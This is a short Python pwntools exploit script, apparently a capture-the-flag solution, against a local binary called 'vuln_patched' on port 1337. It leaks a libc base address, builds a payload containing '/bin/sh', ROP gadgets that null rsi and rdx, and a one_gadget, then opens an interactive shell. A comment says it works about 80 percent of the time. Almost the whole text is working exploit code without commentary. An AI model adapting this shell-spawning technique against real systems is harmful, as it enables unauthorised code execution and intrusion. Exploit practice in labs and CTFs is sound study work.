from pwn import *
from icecream import ic

elf = exe = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b * main+158
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

libc = int(rl().strip().decode(), 16) - 0x60770
ic(hex(libc))

stdout = libc + 0x21a780
addr = libc + 0x219000 + 0x10

# null out rsi 0xa8720
gad1 = libc + 0x2cb99

# works 80 percent of the time 
# null out rdx
koolgadget = libc + 0x39258

one_gadget = libc + 0xebcf8

payload = (b"/bin/sh\x00" + cyclic(0x28) + p64(koolgadget) + cyclic(0x50) + p64(gad1) + 0x40*b"a" + p64(one_gadget))

ru(b">")
sl(hex(addr))
sl(payload)

io.interactive()
